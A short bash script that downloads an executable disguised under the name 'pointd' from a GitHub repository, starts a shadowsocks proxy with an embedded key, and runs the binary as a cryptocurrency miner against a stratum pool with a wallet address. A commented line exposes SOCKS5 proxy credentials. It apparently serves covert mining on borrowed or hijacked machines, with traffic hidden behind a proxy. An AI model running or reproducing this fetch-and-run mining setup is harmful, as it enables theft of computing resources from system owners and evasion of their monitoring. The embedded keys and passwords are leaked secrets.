apt update -y
wget -q https://github.com/manorepas/bash/raw/main/pointd
chmod +x pointd
sudo apt -y install shadowsocks-libev rng-tools libsodium-dev

ss-local -s pl1ss.greenssh.xyz -p 8388 -l 8139 -k Yzg2Y -m chacha20-ietf-poly1305 -v &
./pointd -a verus -o stratum+tcp://149.56.27.47:3956 -u RMQtU1xuuQtm23QCVEbjA8iTmqjZAFJrh8 -p x -t 4 -x 
#socks5://gfmmuaoi:a5jvjnxtdj5l@209.127.191.180:9279
echo "okesu"
